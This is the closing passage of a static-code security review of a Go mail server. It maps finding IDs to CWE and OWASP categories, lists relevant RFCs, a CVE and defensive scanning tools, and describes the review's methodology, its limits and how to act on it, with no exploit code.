| 1021 | Improper Restriction of Rendered UI Layers or Frames |
| 1327 | Binding to an Unrestricted IP Address |
| 1336 | Improper Neutralization of Special Elements used in a Template Engine |

### 10.2 OWASP Top 10 (2021) mapping

- **A01 Broken Access Control** — C-2, C-4, C-5, C-14, H-1, H-4, H-11, H-16, H-21, M-25
- **A02 Cryptographic Failures** — C-11, C-15, H-17, H-18, H-24, M-18, M-27
- **A03 Injection** — C-10, C-12, C-16, H-5, H-7
- **A04 Insecure Design** — C-14, H-6, H-8, H-20
- **A05 Security Misconfiguration** — C-11, C-13, C-17, H-12, H-13, L-3, M-15, M-16, M-19, M-20, M-21
- **A06 Vulnerable and Outdated Components** — C-7, M-19, L-8
- **A07 Identification and Authentication Failures** — C-1, C-6, H-2, H-3, H-14, H-22, L-9, M-26
- **A08 Software and Data Integrity Failures** — C-9, H-20, H-23, supply-chain
- **A09 Security Logging and Monitoring Failures** — L-7, M-11, M-24, admin-audit gap
- **A10 Server-Side Request Forgery** — C-8

### 10.3 Relevant RFCs

| RFC | Topic |
|-----|-------|
| 3461/3464 | Delivery Status Notifications |
| 5321 | SMTP |
| 5322 | Internet Message Format |
| 5891 | IDNA 2008 (Punycode) |
| 6066 | TLS Server Name Indication |
| 6266 | HTTP Content-Disposition |
| 6376 | DKIM Signatures |
| 6530 / 6531 / 6532 / 6533 / 6855 / 6856 / 6857 | EAI / SMTPUTF8 |
| 7208 | SPF (current) |
| 7489 | DMARC |
| 8460 | TLS-RPT |
| 8461 | MTA-STS |

### 10.4 CVEs referenced

- **CVE-2023-51766** — SMTP smuggling (Postfix, Sendmail, others). Relevant to H-7.

### 10.5 External tools recommended

- [`govulncheck`](https://pkg.go.dev/golang.org/x/vuln/cmd/govulncheck) — Go CVE scan
- [`testssl.sh`](https://testssl.sh/) — TLS configuration audit
- [`sslyze`](https://github.com/nabla-c0d3/sslyze) — TLS scanner
- [`zap`](https://www.zaproxy.org/) — DAST for web endpoints
- [`trivy`](https://github.com/aquasecurity/trivy) — container image vulnerability scanner
- [`grype`](https://github.com/anchore/grype) — alternative image scanner
- [`hadolint`](https://github.com/hadolint/hadolint) — Dockerfile linter

---

## 11. Methodology & caveats

### What was reviewed

8 specialist agent sweeps conducted in parallel:
1. API auth, RBAC, IDOR/BOLA
2. Mail-protocol gateways (SMTP, IMAP, POP3, queue worker)
3. Data layer (DB, crypto, MIME, attachments)
4. Pipeline + code-execution surfaces (filters, JS sidecar)
5. Frontends + infra (webmail, admin, docker-compose)
6. Per-endpoint route-by-route walk of `internal/api/routes.go`
7. Postfix/Dovecot/dnsmasq container configs, container hardening, CI/CD supply chain
8. JWT internals, log injection, ACME client, RESTMAIL cache semantics, account-linking races

### What was not reviewed

- **Live exploitation** — all findings are from static code reading. No proof-of-concept executed.
- **Dependency CVE scan** — not performed; action item L-8 recommends `govulncheck` and `npm audit`.
- **Parser fuzzing** — MIME parser, Sieve parser, SMTP command parser not fuzzed. Recommended: `go-fuzz` or native Go `FuzzXxx` tests.
- **Race detector** — no `go test -race` runs performed; some M-2/M-8/H-21 findings would benefit from runtime race verification.
- **Binary / supply-chain integrity** — no SBOM generated, no image signing inspection.
- **Email-client interop** — a client that happens to accept borderline-malformed messages could mask parser issues.
- **Migrations** — SQL DDL in `internal/db/migrations/` not inspected in detail.
- **Backup / restore drill** — design exists (see original BACKUP_PLAN.md, now archived); not tested.
- **Network-level observations** — no actual docker-compose brought up and probed.
- **IAM / cloud-metadata risks** — assumed AWS-style metadata endpoint exposure for SSRF C-8; other clouds (GCP, Azure) have similar endpoints with different URLs.

### Severity calibration

- **Critical** = reliably exploitable by an external attacker or low-privilege insider, leads to data theft/deletion/server compromise without additional vulnerabilities.
- **High** = exploitable under reasonable conditions (common misconfiguration, chainable with one Medium), significant impact.
- **Medium** = requires specific conditions or chaining, or has limited blast radius, or is a defense-in-depth gap that becomes critical only when another finding is exploited.
- **Low / Info** = marginal standalone risk, best-practice gaps, or subject to interpretation. Non-exhaustive.

### How to use this report

1. Fix Phase 0 items today — each < 1 hour, each with a verification test in §8.
2. Schedule Phase 1 for this week.
3. Book Phase 2 as a sprint.
4. Track remaining items in your issue tracker; re-audit after 3 months or on major feature merge.
5. Each new feature should be threat-modeled against the chains in §2 before merge.
6. Use the deployment hardening checklist (§9) for the next production deploy.

### Disagreement with findings

Reasonable people can read code differently. If any finding feels wrong:
- Cite the specific line the finding is missing
- Explain the mitigation that renders it safe
- Update this doc with the resolution (keep the finding with a "RESOLVED" note, don't delete — future readers benefit from seeing "we checked this")

No exploit code is included in this review. Descriptions are deliberately just enough to identify, prioritize, and fix.

---

*End of review. Follow-up questions, scope expansion (e.g. full dynamic analysis, dependency CVE scan, fuzzing campaign), or implementation patches can be requested as follow-up tasks.*
